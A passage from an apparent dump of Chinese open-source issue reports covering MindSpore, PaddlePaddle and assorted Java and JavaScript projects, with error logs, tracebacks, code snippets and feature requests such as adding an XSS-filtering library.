[/home/jenkins/agent-working-dir/workspace/Compile_Lite_X86_3516D/nnie_code/mindspore/mindspore/lite/tools/converter/adapter/nnie/src/nnie_segdata_generate.cc:652] GenerateCustomLayerOutputData] Generate input data failed from image list. [ERROR] API(53,7f71e1115f40,converter_lite):2022-11-09-11:03:54.900.824 [/home/jenkins/agent-working-dir/workspace/Compile_Lite_X86_3516D/nnie_code/mindspore/mindspore/lite/tools/converter/adapter/nnie/src/nnie_pass.cc:899] GenerateCustomOutput] Generate CustomLayer OutputData failed [ERROR] API(53,7f71e1115f40,converter_lite):2022-11-09-11:03:54.900.880 [/home/jenkins/agent-working-dir/workspace/Compile_Lite_X86_3516D/nnie_code/mindspore/mindspore/lite/tools/converter/adapter/nnie/src/nnie_pass.cc:768] GetWKData] generate custom output failed [ERROR] API(53,7f71e1115f40,converter_lite):2022-11-09-11:03:54.900.923 [/home/jenkins/agent-working-dir/workspace/Compile_Lite_X86_3516D/nnie_code/mindspore/mindspore/lite/tools/converter/adapter/nnie/src/nnie_pass.cc:1375] Execute] get wk data failed. [WARNING] LITE(53,7f71e1115f40,converter_lite):2022-11-09-11:03:54.900.976 [mindspore/lite/tools/converter/optimizer_manager.cc:54] RunOptimizerPass] run pass failed, pass name is NniePass [WARNING] LITE(53,7f71e1115f40,converter_lite):2022-11-09-11:03:54.901.016 [mindspore/lite/tools/converter/optimizer_manager.cc:85] RunExternalPass] run external scheduled task failed. [net_type] 0 [ERROR] LITE(53,7f71e1115f40,converter_lite):2022-11-09-11:03:54.901.058 [mindspore/lite/tools/converter/anf_transform.cc:616] RunPass] Run external pass failed, place is BEGIN [ERROR] LITE(53,7f71e1115f40,converter_lite):2022-11-09-11:03:54.901.076 [mindspore/lite/tools/converter/anf_transform.cc:684] TransformFuncGraph] Proc online transform failed. [ERROR] LITE(53,7f71e1115f40,converter_lite):2022-11-09-11:03:54.901.088 [mindspore/lite/tools/converter/anf_transform.cc:780] Transform] optimizer failed. [ERROR] LITE(53,7f71e1115f40,converter_lite):2022-11-09-11:03:54.901.102 [mindspore/lite/tools/converter/converter.cc:170] FuncGraphConvert] ""Transform anf graph return nullptr."" [ERROR] LITE(53,7f71e1115f40,converter_lite):2022-11-09-11:03:54.901.135 [mindspore/lite/tools/converter/converter.cc:852] RunConverter] Convert model failed [ERROR] LITE(53,7f71e1115f40,converter_lite):2022-11-09-11:03:54.902.012 [mindspore/lite/tools/converter/cxx_api/converter.cc:289] Convert] Convert model failed, ret=-1 ERROR [mindspore/lite/tools/converter/converter_lite/main.cc:74] main] Convert failed. Ret: Common error code. Convert failed. Ret: Common error code."
[CT][MS][OP]Partial op example result incorrect at official website,": ascend, gpu, cpu /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : 执行官网样例 官网列出来的结果与实际执行结果不一致 官网结果与实际执行结果一致   <code>: from mindspore import Tensor from mindspore.ops import operations as P def show_input(x, y, z): return x, y, z partial = P.Partial() partial_show_input = partial(show_input, Tensor(1)) output1 = partial_show_input(Tensor(2), Tensor(3)) print(output1) output2 = partial_show_input(Tensor(3), Tensor(4)) print(output2) Expected: (1, 2, 3) Got: (Tensor(shape=[], dtype=Int64, value= 1), Tensor(shape=[], dtype=Int64, value= 2), Tensor(shape=[], dtype=Int64, value= 3)) Expected: (1, 3, 4) Got: (Tensor(shape=[], dtype=Int64, value= 1), Tensor(shape=[], dtype=Int64, value= 3), Tensor(shape=[], dtype=Int64, value= 4))"
bootstrapTable使用insertRow添加行后点击行内输入框报错,"报错如下： 相关js： 在调用insertRow插入行后，点击行内的输入框，则会报这个错，求救   <code>: bootstrap-table.min.js?v=20200727:7 Uncaught TypeError: Cannot read property 'hasOwnProperty' of undefined at Object.getItemField (bootstrap-table.min.js?v=20200727:7) at HTMLTableCellElement.&lt;anonymous&gt; (bootstrap-table.min.js?v=20200727:8) at HTMLTableCellElement.dispatch (jquery.min.js:3) at HTMLTableCellElement.r.handle (jquery.min.js:3) let rowsArr = []; $(function () { var options = { url: ""/pub/purchaseList/list/x"", pagination: false, showSearch: false, showRefresh: false, showToggle: false, showColumns: false, uniqueId: 'itemId', columns: [ { checkbox: true, width: ""5%"" }, { field: 'itemId', title: '名称', width: ""15%"" }, { field: 'name', title: '名称', width: ""15%"", formatter: function (value, row, index) { rowsArr[index] = row; var html = $.common.sprintf(""&lt;input class='form-control' type='text' name='purchaseLists["" + index + ""].name' value='%s' onblur='checkVal(1,this.value,"" + index + "")' required&gt;"", value); return html; } }, { field: 'standard', title: '规格', width: ""15%"", formatter: function (value, row, index) { rowsArr[index] = row; var html = $.common.sprintf(""&lt;input class='form-control' type='text' name='purchaseLists["" + index + ""].standard' value='%s' onblur='checkVal(2,this.value,"" + index + "")' required&gt;"", value); return html; } }, { field: 'quantity', title: '数量', width: ""7%"", formatter: function (value, row, index) { var html = $.common.sprintf(""&lt;input class='form-control' type='text' name='purchaseLists["" + index + ""].quantity' value='%s' onblur='checkVal(3,this.value,"" + index + "")' number required&gt;"", value); return html; } }, { field: 'unit', title: '单位', width: ""5%"", formatter: function (value, row, index) { var html = $.common.sprintf(""&lt;input class='form-control' type='text' name='purchaseLists["" + index + ""].unit' value='%s' onblur='checkVal(4,this.value,"" + index + "")' required&gt;"", value); return html; } }, { field: 'unitPrice', title: '单价', width: ""7%"", formatter: function (value, row, index) { var html = $.common.sprintf(""&lt;input class='form-control' type='text' name='purchaseLists["" + index + ""].unitPrice' value='%s' onblur='checkVal(5,this.value,"" + index + "")' required&gt;"", value); return html; } }, { field: 'method', title: '购买途径', width: ""10%"", formatter: function (value, row, index) { var html = $.common.sprintf(""&lt;input class='form-control' type='text' name='purchaseLists["" + index + ""].method' value='%s' onblur='checkVal(6,this.value,"" + index + "")' required&gt;"", value); return html; } }, { field: 'url', title: '购买链接', width: ""10%"", formatter: function (value, row, index) { rowsArr[index] = row; var html = $.common.sprintf(""&lt;input class='form-control' type='text' name='purchaseLists["" + index + ""].url' value='%s' onblur='checkVal(7,this.value,"" + index + "")' required&gt;"", value); return html; } }, { field: 'sourceOfFund', title: '经费来源', width: ""10%"", formatter: function (value, row, index) { rowsArr[index] = row; var html = $.common.sprintf(""&lt;input class='form-control' type='text' name='purchaseLists["" + index + ""].sourceOfFund' value='%s' onblur='checkVal(8,this.value,"" + index + "")' required&gt;"", value); return html; } }, { field: 'remark', title: '备注', width: ""20%"", formatter: function (value, row, index) { rowsArr[index] = row; var html = $.common.sprintf(""&lt;input class='form-control' type='text' name='purchaseLists["" + index + ""].remark' value='%s' onblur='checkVal(9,this.value,"" + index + "")' required&gt;"", value); return html; } }] }; $.table.init(options); }); let rowIndex = 0; /* 新增表格行 */ function insertRow() { $(""#"" + table.options.id).bootstrapTable('insertRow', { index: rowIndex++, // index row: { itemId: rowIndex, name: '', standard: '', quantity: '', unit: '', unitPrice: '', method: '', url: '', sourceOfFund: '', remark: '', } }) }"
【Bug】MAX、MIN函数错误,"name: '报告Bug ' about: 报告 SurveyKing 的 bug title: '[BUG]' labels: 'bug' assignees: '' 提问前先看看： https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/README-zh_CN.md bug 描述 MAX(单行文本框1,单行文本框2）,实时显示正确，但光标聚焦移出文本框后，结果永远回归0，MIN函数相同 复现步骤 期望结果 复现代码 版本信息 SurveyKing 版本: 1.2.2 浏览器环境:pc chrome、ios safari、安卓夸克浏览器 开发环境：docker-compose 其他信息   <code>: { ""id"": ""WvDf62"", ""title"": ""test"", ""description"": ""感谢您能抽出几分钟时间来参加本次答题，现在我们就马上开始吧！"", ""type"": ""Survey"", ""attribute"": { ""suffix"": ""您已完成本次问卷，感谢您的帮助与支持"", ""submitButton"": ""提交"" }, ""children"": [ { ""title"": ""111"", ""type"": ""FillBlank"", ""attribute"": { ""required"": true }, ""id"": ""0y6x"", ""children"": [ { ""attribute"": { ""dataType"": ""number"" }, ""id"": ""9jqu"" } ] }, { ""title"": ""22"", ""type"": ""FillBlank"", ""attribute"": { ""required"": true }, ""id"": ""mam3"", ""children"": [ { ""attribute"": { ""dataType"": ""number"" }, ""id"": ""vojk"" } ] }, { ""title"": ""333"", ""type"": ""FillBlank"", ""attribute"": { ""required"": true }, ""id"": ""88da"", ""children"": [ { ""attribute"": { ""calculate"": ""MAX(SUM(#{0y6x},0),SUM(#{mam3},0))"" }, ""id"": ""s1bu"" } ] } ] }"
Remove `CopyFrom` and `CopyFromVector` from Tensor interface and make them global functions,Remove and from Tensor interface and make them global functions   <code>: CopyFrom CopyFromVector
bug-打印空tensor报错,"报错：   <code>: import paddle from paddle.fluid.layers import where x = paddle.ones((10,10)) y = where(x==0) print(y) Traceback (most recent call last): File ""/Users/xmy/Desktop/pycharm_project/PSENet/test.py"", line 6, in &lt;module&gt; print(y) File ""/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/paddle/fluid/dygraph/varbase_patch_methods.py"", line 265, in __str__ return to_string(self) File ""/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/paddle/tensor/to_string.py"", line 214, in to_string max_width, signed = _get_max_width(_to_sumary(np_var)) File ""/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/paddle/tensor/to_string.py"", line 110, in _to_sumary return np.stack([_to_sumary(x) for x in var]) File ""&lt;__array_function__ internals&gt;"", line 6, in stack File ""/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/numpy/core/shape_base.py"", line 423, in stack raise ValueError('need at least one array to stack') ValueError: need at least one array to stack"
在infer的时候，metrics.Auc和layers.auc得出的auc值相差10个百分点,"1）PaddlePaddle版本：1.4.1 2）CPU 3）系统环境：centos -预测信息 1）使用进行加载预测 问题描述：在infer的时候，metrics.Auc比layers.auc得出的auc值低10个百分点 auc预测代码： 在网络中的auc定义为 2.Auc预测代码   <code>: fluid.io.load_persistables auc_var, batch_auc_var, auc_states = layers.auc(input=fc, label=self.datas[-1]) infer_program = fluid.default_main_program().clone(for_test=True) place = fluid.CPUPlace() exe = fluid.Executor(place) exe.run(fluid.default_startup_program()) fluid.io.load_persistables(exe, args.model_output_dir + '/pass-', infer_program) inference_scope = fluid.Scope() def set_zero(var_name): param = inference_scope.var(var_name).get_tensor() param_array = np.zeros(param._get_dims()).astype(""int64"") param.set(param_array, place) for auc_state in auc_states: set_zero(auc_state.name) batch_id = 0 py_reader.start() while True: try: results, auc_val = exe.run(infer_program, fetch_list=[cost, auc_var]) if batch_id % 100 == 0: logger.info(""TEST --&gt; batch: {} loss:{} auc:{}"".format(batch_id, results, auc_val)) except fluid.core.EOFException: py_reader.reset() break infer_program = fluid.default_main_program().clone(for_test=True) place = fluid.CPUPlace() exe = fluid.Executor(place) exe.run(fluid.default_startup_program()) fluid.io.load_persistables(exe, args.model_output_dir + '/pass-', infer_program) batch_id = 0 py_reader.start() auc_metric = fluid.metrics.Auc(""ROC"") while True: try: results, y_pred, y_true = exe.run(infer_program, fetch_list=[cost, preds, label]) auc_metric.update(y_pred, y_true) if batch_id % 100 == 0: logger.info(""TEST --&gt; batch: {} loss:{} auc:{}"".format(batch_id, results, auc_metric.eval())) except fluid.core.EOFException: py_reader.reset() break"
日志warning信息重复冗余，且有误导性,"MindSpore版本：1.1.1 firmware版本：1.76.22.1.220 Ascend910 环境 在运行时报warning： 以上信息具体重复性，而且这种信息不适合放在warning里，版本不兼容是个很大的问题，但其实是可以运行的   <code>: [WARNING] ME(87797:140029953869632,MainProcess):2021-02-09-16:51:23.128.193 [mindspore/_check_version.py:190] MindSpore version 1.1.1 and Ascend 910 AI software package version 1.76.22.1.220 does not match, the version of software package expect one of ['1.76.22.3.220'], please reference to the match info on: https://www.mindspore.cn/install [WARNING] ME(87797:140029953869632,MainProcess):2021-02-09-16:51:24.457.987 [mindspore/_check_version.py:207] MindSpore version 1.1.1 and ""hccl"" wheel package version 1.76.22.1.220 does not match, reference to the match info on: https://www.mindspore.cn/install MindSpore version 1.1.1 and ""te"" wheel package version 1.0 does not match, reference to the match info on: https://www.mindspore.cn/install MindSpore version 1.1.1 and ""topi"" wheel package version 0.6.0 does not match, reference to the match info on: https://www.mindspore.cn/install [WARNING] ME(87797:140029953869632,MainProcess):2021-02-09-16:51:24.849.148 [mindspore/ops/operations/array_ops.py:2302] WARN_DEPRECATED: The usage of Pack is deprecated. Please use Stack. [WARNING] ME(87806:139705842964288,MainProcess):2021-02-09-16:51:25.524.133 [mindspore/_check_version.py:190] MindSpore version 1.1.1 and Ascend 910 AI software package version 1.76.22.1.220 does not match, the version of software package expect one of ['1.76.22.3.220'], please reference to the match info on: https://www.mindspore.cn/install [WARNING] ME(87806:139705842964288,MainProcess):2021-02-09-16:51:26.702.005 [mindspore/_check_version.py:207] MindSpore version 1.1.1 and ""hccl"" wheel package version 1.76.22.1.220 does not match, reference to the match info on: https://www.mindspore.cn/install MindSpore version 1.1.1 and ""te"" wheel package version 1.0 does not match, reference to the match info on: https://www.mindspore.cn/install MindSpore version 1.1.1 and ""topi"" wheel package version 0.6.0 does not match, reference to the match info on: https://www.mindspore.cn/install WARNING: 'ControlDepend' is deprecated from version 1.1 and will be removed in a future version, use 'Depend' instead. [WARNING] ME(87806:139705842964288,MainProcess):2021-02-09-16:51:27.904.87 [mindspore/ops/operations/array_ops.py:2302] WARN_DEPRECATED: The usage of Pack is deprecated. Please use Stack. version 1.76.22.1.220 does not match"
Crash when training Word2Vec using Debug build,"I found that when running the Word2Vec model training if the Paddle was built as Debug, there is an error. It works fine with the Release build of PaddlePaddle. Engine: Training on CPU with MKL-DNN (not checked without MKLDNN) Operating System: Ubuntu 18.04 PaddlePaddle version: develop branch (tested commit 6e946e9de7735cd38437ce4b08141f7a9573ab21) , but issue occurs on older revisions as well. To reproduce it, you can use the files and the commands given here https://github.com/PaddlePaddle/Paddle/issues/30560#issuecomment-782529410 , just change the Release flag to Debug. The error shows up with both ways to run: and The log looks very similar to the one already mentioned in the issue https://github.com/PaddlePaddle/Paddle/issues/24863 Here is the stack trace:   <code>: cd 2.0benchmark/ps/static/word2vec python -u ../train.py -c benchmark.yaml cd 2.0benchmark/ps/static/word2vec fleetrun --worker_num=1 --server_num=1 ../train.py -c benchmark.yaml -------------------------------------- C++ Traceback (most recent call last): -------------------------------------- 0 std::vector&lt;paddle::framework::LoDTensor, std::allocator&lt;paddle::framework::LoDTensor&gt; &gt;::clear() 1 std::vector&lt;paddle::framework::LoDTensor, std::allocator&lt;paddle::framework::LoDTensor&gt; &gt;::_M_erase_at_end(paddle::framework::LoDTensor*) 2 void std::_Destroy&lt;paddle::framework::LoDTensor*, paddle::framework::LoDTensor&gt;(paddle::framework::LoDTensor*, paddle::framework::LoDTensor*, std::allocator&lt;paddle::framework::LoDTensor&gt;&amp;) 3 void std::_Destroy&lt;paddle::framework::LoDTensor*&gt;(paddle::framework::LoDTensor*, paddle::framework::LoDTensor*) 4 void std::_Destroy_aux&lt;false&gt;::__destroy&lt;paddle::framework::LoDTensor*&gt;(paddle::framework::LoDTensor*, paddle::framework::LoDTensor*) 5 void std::_Destroy&lt;paddle::framework::LoDTensor&gt;(paddle::framework::LoDTensor*) 6 paddle::framework::LoDTensor::~LoDTensor() 7 std::vector&lt;paddle::framework::CPUVector&lt;unsigned long&gt;, std::allocator&lt;paddle::framework::CPUVector&lt;unsigned long&gt; &gt; &gt;::~vector() 8 void std::_Destroy&lt;paddle::framework::CPUVector&lt;unsigned long&gt;*, paddle::framework::CPUVector&lt;unsigned long&gt; &gt;(paddle::framework::CPUVector&lt;unsigned long&gt;*, paddle::framework::CPUVector&lt;unsigned long&gt;*, std::allocator&lt;paddle::framework::CPUVector&lt;unsigned long&gt; &gt;&amp;) 9 void std::_Destroy&lt;paddle::framework::CPUVector&lt;unsigned long&gt;*&gt;(paddle::framework::CPUVector&lt;unsigned long&gt;*, paddle::framework::CPUVector&lt;unsigned long&gt;*) 10 void std::_Destroy_aux&lt;false&gt;::__destroy&lt;paddle::framework::CPUVector&lt;unsigned long&gt;*&gt;(paddle::framework::CPUVector&lt;unsigned long&gt;*, paddle::framework::CPUVector&lt;unsigned long&gt;*) 11 void std::_Destroy&lt;paddle::framework::CPUVector&lt;unsigned long&gt; &gt;(paddle::framework::CPUVector&lt;unsigned long&gt;*) 12 paddle::framework::CPUVector&lt;unsigned long&gt;::~CPUVector() 13 std::vector&lt;unsigned long, std::allocator&lt;unsigned long&gt; &gt;::~vector() 14 paddle::framework::SignalHandle(char const*, int) 15 paddle::platform::GetCurrentTraceBackString[abi:cxx11]()"
这块代码逻辑是不是存在问题呢？,com.ruoyi.framework.shiro.web.filter.online.OnlineSessionFilter 的54行附近 我的理解是：如果是游客的话，user将一直为null。这段代码是不是就没用了呢？ 是不是其实是想表达：非游客时将user对象设置进去，但是写错了呢？ 这一块没有读懂，望解答，谢谢！   <code>: // 把user对象设置进去 boolean isGuest = onlineSession.getUserId() == null || onlineSession.getUserId() == 0L; if (isGuest == true) { SysUser user = ShiroUtils.getSysUser(); if (user != null) { onlineSession.setUserId(user.getUserId()); onlineSession.setLoginName(user.getLoginName()); onlineSession.setAvatar(user.getAvatar()); onlineSession.setDeptName(user.getDept().getDeptName()); onlineSession.markAttributeChanged(); } }
引入 Mica-XSS 插件，避免 element 部分xss 脚本未转义攻击问题,"https://gitee.com/596392912/mica/tree/master/mica-xss mica-xss 组件 说明 对表单绑定的字符串类型进行 xss 处理。 对 json 字符串数据进行 xss 处理。 提供路由和控制器方法级别的放行规则。 使用 maven gradle 配置 配置项 默认值 mica.xss.enabled true 开启xss mica.xss.path-patterns 拦截的路由，必须配置，例如: /api/order/** mica.xss.exclude-patterns 放行的规则，默认为空 注解 可以使用 注解对方法和类级别进行忽略。   <code>: &lt;dependency&gt; &lt;groupId&gt;net.dreamlu&lt;/groupId&gt; &lt;artifactId&gt;mica-xss&lt;/artifactId&gt; &lt;version&gt;${version}&lt;/version&gt; &lt;/dependency&gt; compile(""net.dreamlu:mica-xss:${version}"") @XssCleanIgnore"
Code block for paddle.layer.gated_united cannot be correctly generated.,"See here: http://www.paddlepaddle.org/docs/develop/documentation/zh/api/v2/config/layer.html#gated-unit I got the following error when compiling the doc:   <code>: /home/caoying/paddle_codes/paddle_github/python/paddle/v2/layer.py:docstring of paddle.v2.layer.gated_unit:15: ERROR: Error in ""code-block"" directive: maximum 1 argument(s) allowed, 5 supplied. .. code-block:: python gated_unit = gated_unit(size=128, input=input))"
分组的支持什么时候能帮做到兼容啊,"@guhaibin public Docket innerApi() { return new Docket(DocumentationType.SWAGGER_2) .groupName(""inner api"") .apiInfo(innerApiInfo()) .select() .apis(RequestHandlerSelectors.basePackage(""com.xx.controllers.web"")) .paths(PathSelectors.any()) .build(); } 使用原生态的swagger-ui.html是支持的，分组还是必要的。   <code>: @Bean public Docket openApi() { return new Docket(DocumentationType.SWAGGER_2) .groupName(""open api"") .apiInfo(openApiInfo()) .select() .apis(RequestHandlerSelectors.basePackage(""com.xx.controllers.api"")) .paths(PathSelectors.any()) .build(); }"
form验证select，没有焦点定位,在form.js源码line:672，增加一个if   <code>: if (item.tagName.toLowerCase() === 'select') { return othis.next().find('.layui-input').focus(); } else { item.focus(); }
5.0.07 Core版Sqlite查询时报错,之前用4.9.9.3没有问题，升级成5.0.0.7后，很简单的查询就报错 表与实体的关系   <code>: English Message : Entity mapping error.Bad IL format. Chinese Message : 实体与表映射出错。Bad IL format.
加载参数 load parameter,"我的output是这样的 47 fc_last = paddle.layer.pooling( 48 input=inputs[0], pooling_type=paddle.pooling.Max()) 49 lstm_last = paddle.layer.pooling( 50 input=inputs[1], pooling_type=paddle.pooling.Max()) 51 if infer == True: 52 output = paddle.layer.concat(fc_last,lstm_last) 53 return output 然后我load了以前的训练parameter 后面还要加fc层 想把parameter赋给output 怎么办？   <code>: with open(para_path_2, ""r"") as f: parameters_2 = paddle.parameters.Parameters.from_tar(f)"
服务的注解处理，进行一下优化,"public @interface ServiceMethod { boolean cachable() default false; } 所有属性都可以省略。 serviceId默认为：类名.方法名 ServiceResult的默认值，由原来的result改成： 类名.方法名.result   <code>: String serviceId(); String localName() default """"; String description() default """"; boolean cacheable() default false;"
Pagination类的asc字段有两个getter方法导致ReflectionException异常,回退到2.1.3就不抛出异常了   <code>: org.apache.ibatis.reflection.ReflectionException: Illegal overloaded getter method with ambiguous type for property asc in class class com.baomidou.mybatisplus.plugins.pagination.Pagination. This breaks the JavaBeans specification and can cause unpredictable results.
 [改进] 多语言模块功能,"去除需要在启动层创建 空类的要求（过去这个设计不合理） 支持自定义 资源文件名，如： 支持自定义 文件夹位置（可以放在任意程序集）   <code>: Lang.cs Lang.区域码.resx Local.区域码.resx Resouces { ""LocalizationSettings"": { ""LanguageFilePrefix"": ""Local"" // ""AssemblyName"": ""你的其他层程序集名称"" } }"
对自己传入数据的lodtensor调用op操作时报错说输入不是一个variable,"函数的输入是两个字典，需要对不同的key对应的value(是一个lodtensor)进行拼接，concat的输入打印出来是这样的 输入转成numpy array后是[[1]]、[[1]] 调用op后报错如下： 函数的输出组织成字典的形式直接通过feed传给exe，想请问下是我使用的方法不对还是什么问题呢？   <code>: def merge_dict(dict, item): temp= {} list = ['category', 'item_type', 'layout', 'pos', 'cuid', 'province', 'net_type'] for i in range(len(list)): if i &gt; 3: temp[list[i]] = dict[list[i]] else: ''' print dict[list[i]] print item[list[i]] ''' temp[list[i]] = fluid.layers.sequence_concat(input=[dict[list[i]], item[list[i]]]) return temp &lt;paddle.fluid.core.LoDTensor object at 0x7fc70982cd18&gt; &lt;paddle.fluid.core.LoDTensor object at 0x7fc70982cc38&gt; File ""eval_temp.py"", line 410, in merge_dict temp[list[i]] = fluid.layers.sequence_concat(input=[dict[list[i]], item[list[i]]]) File ""/home/user/paddle_release_home/python/lib/python2.7/site-packages/paddle/fluid/layers/nn.py"", line 2149, in sequence_concat out = helper.create_variable_for_type_inference(dtype=helper.input_dtype()) File ""/home/user/paddle_release_home/python/lib/python2.7/site-packages/paddle/fluid/layer_helper.py"", line 102, in input_dtype inputs = self.multiple_input(input_param_name) File ""/home/user/paddle_release_home/python/lib/python2.7/site-packages/paddle/fluid/layer_helper.py"", line 64, in multiple_input raise type_error TypeError: Input of sequence_concat layer should be Variable or sequence of Variable"
积木报表如果动态回车换行(自动换行达不到场景需求),版本号：2.4.6 场景图   <code>: 需要回车换行，我们的积木报表支持自动换行，但不能动态回车换行，如何实现呢
[高校贡献-MindSpore模型训练]（1）Conv3dTranspose算子 不支持7*7*7以上的filter_size  （2）Conv3D网络使用 Adam优化器在NPU上报错,"(1)Conv3dTranspose算子 不支持7<em>7</em>7以上的filter_size (2) Conv3d 网络Adam优化器在NPU上报错 kind/bug comp/optimizer device/gpu Hardware Environment(/): /device gpu : -- MindSpore version (binary 1.3.0): -- Python version (Python 3.7.5): -- OS platform and distribution (Linux Ubuntu 16.04): Test Demo 查阅其他issue似乎换优化器能够解决在NPU上的问题。#I3WABC:3D网络，Adam优化器单卡训练出错   <code>: import numpy as np from mindspore import nn, context from mindspore import Model import mindspore.dataset as ds from mindspore.common.tensor import Tensor import mindspore.nn as nn from mindspore import dtype as mstype from mindspore.ops import operations as P from mindspore.nn.loss.loss import LossBase import numpy as np class SoftmaxCrossEntropyWithLogits(LossBase): def __init__(self): super(SoftmaxCrossEntropyWithLogits, self).__init__() self.transpose = P.Transpose() self.reshape = P.Reshape() self.loss_fn = nn.SoftmaxCrossEntropyWithLogits(sparse=False) self.cast = P.Cast() self.reduce_mean = P.ReduceMean() self.num_classes = 4 def construct(self, logits, label): # handle ignore labels logits = self.transpose(logits, (0, 2, 3, 4, 1)) label = self.transpose(label, (0, 2, 3, 4, 1)) label = self.cast(label, mstype.float32) loss = self.reduce_mean(self.loss_fn(self.reshape(logits, (-1, self.num_classes)), \ self.reshape(label, (-1, self.num_classes)))) return self.get_loss(loss) class Net(nn.Cell): def __init__(self): super(Net, self).__init__() self.conv3dTranspose = nn.Conv3dTranspose(in_channels=32,out_channels= 4, kernel_size=8,stride=8,padding=1, pad_mode='pad', bias_init=False) def construct(self, x): return self.conv3dTranspose(x) def generator(): for i in range(2): yield (np.ones([2, 32,1,4,4]).astype(np.float32), np.ones([2,4,6,32]).astype(np.int32)) def train(net): optimizer = nn.Momentum(net.trainable_params(), 1, 0.9) loss = SoftmaxCrossEntropyWithLogits() model = Model(net, loss, optimizer) data = ds.GeneratorDataset(generator, [""data"", ""label""]) model.train(1, data) if __name__ == '__main__': context.set_context(mode=context.PYNATIVE_MODE, device_target=""Ascend"") # Train Model net = Net() train(net)"
DateUtil 不支持单位数时间格式转换： 2017-12-25 9:40:00,"支持 2017-12-25 09:40:00 不支持 2017-12-25 9:40:00 希望完善此格式   <code>: Exception in thread ""Thread-4"" com.xiaoleilu.hutool.date.DateException: [2017-12-25 9:40:00] format is not fit for date pattern!"
How to implement DataParallelEngine,"We should support a Net running on multi-GPUs. And users can just define a Net and set GPU ids, and the parallel running on multi-GPUs will be automatic. In caffe2, NCCL and gloo are used to support multi-GPUs on multi-Servers. And both the operations in NCCL and gloo are represented as . In paddle now, we have implemented MultiGradientMachine and pserver. We might use NCCL to merge gradient in multi-GPUs in our new version. And should we take NCCL operations as ? If NCCL operation is , then one Net might corresponds to multi-GPUs. Or, just we take NCCL operation as a function, then we will have one Net corresponds to one GPU.   <code>: Operator Operator Operator"
jfinal添加logback实现问题,"logback.xml: 使用logback时 节点可以单独设置日志级别，如上 在jfinalj里添加logback实现 发现 LogKit调用的是com.jfinal.kit.LogKit的logger对象，而不会调用在logback.xml定义的com.domain.package的logger对象 求解决 做如下配置才能输出相应的info   <code>: &lt;!-- project default level --&gt; **&lt;logger name=""com.domain.package"" level=""INFO"" /&gt;** &lt;root level=""WARN""&gt; &lt;appender-ref ref=""console"" /&gt; &lt;appender-ref ref=""rollingFile"" /&gt; &lt;/root&gt; &lt;logger name=""com.domain.package"" level=""INFO"" /&gt; 不起作用 LogKit.info(""index controller""); &lt;!-- project default level --&gt; **&lt;logger name=""com.jfinal.kit.LogKit"" level=""INFO"" /&gt;** &lt;root level=""WARN""&gt; &lt;appender-ref ref=""console"" /&gt; &lt;appender-ref ref=""rollingFile"" /&gt; &lt;/root&gt;"
[CT][MS][CI]TbeOpParallelBuild] task compile Failed,": /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_increment_compilation_ir test_increment_compilation_ub pass   <code>: def test_increment_compilation_ir(): with MetaFactory(): input_shape = (128, 128, 28, 28) in_channel = input_shape[1] input_np = np.random.randn(*input_shape).astype(np.float32) weight_np = np.random.randn(in_channel).astype(np.float32) bias_np = np.random.randn(in_channel).astype(np.float32) epsilon = 1e-5 is_training = True return_list = [0] moving_mean_np = np.random.randn(in_channel).astype(np.float32) moving_var_np = np.ones(in_channel).astype(np.float32) net = FusionNetIr(is_training, epsilon, return_list, Parameter(weight_np), Parameter(bias_np), Parameter(moving_mean_np), Parameter(moving_var_np)) &gt; net(Tensor(input_np)) ../increment_compilation/test_increment_compilation.py:241: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:403: in __call__ output = self.run_construct(cast_inputs, kwargs) /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:344: in run_construct output = self.construct(*cast_inputs, **kwargs) ../increment_compilation/test_increment_compilation.py:75: in construct x = self.bn(input_x, self.weight_np, self.bias_np, self.moving_mean_np, self.moving_var_np) /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/ops/primitive.py:217: in __call__ return _run_op(self, self.name, args) /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/common/api.py:75: in wrapper results = fn(*arg, **kwargs) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ obj = Prim[BatchNorm]&lt;is_training=True, epsilon=1e-05, momentum=0.1, data_format=NCHW&gt; op_name = 'BatchNorm' args = (Tensor(shape=[128, 128, 28, 28], dtype=Float32, value= [[[[ 4.96798337e-01, 1.00973375e-01, -9.97362614e-01 ... 2.0...), dtype=Float32, requires_grad=True), Parameter (name=moving_var_np, shape=(128,), dtype=Float32, requires_grad=True)) @_wrap_func def _run_op(obj, op_name, args): """"""Single op execution function supported by ge in PyNative mode."""""" &gt; output = real_run_op(obj, op_name, args) E RuntimeError: mindspore/ccsrc/backend/kernel_compiler/tbe/tbe_kernel_parallel_build.cc:99 TbeOpParallelBuild] task compile Failed, task id:35, cause:TBEException:ERROR: E E Traceback (most recent call last): E File ""/home/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/_extends/parallel_compile/tbe_compiler/compiler.py"", line 150, in build_op E lic_opt_list=rl_tune_list) E File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/te_fusion/fusion_manager.py"", line 1130, in build_single_op E compile_info = call_op() E File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/te_fusion/fusion_manager.py"", line 1118, in call_op E opfunc(*inputs, *outputs, *attrs, **kwargs) E File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/tbe/common/utils/para_check.py"", line 535, in _in_wrapper E return func(*args, **kwargs) E File ""/usr/local/Ascend/opp/op_impl/built-in/ai_core/tbe/impl/trans_data.py"", line 146, in trans_data E dst_format, kernel_name) E File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/topi/cce/util.py"", line 131, in in_wrapper E return func(*args, **kwargs) E File 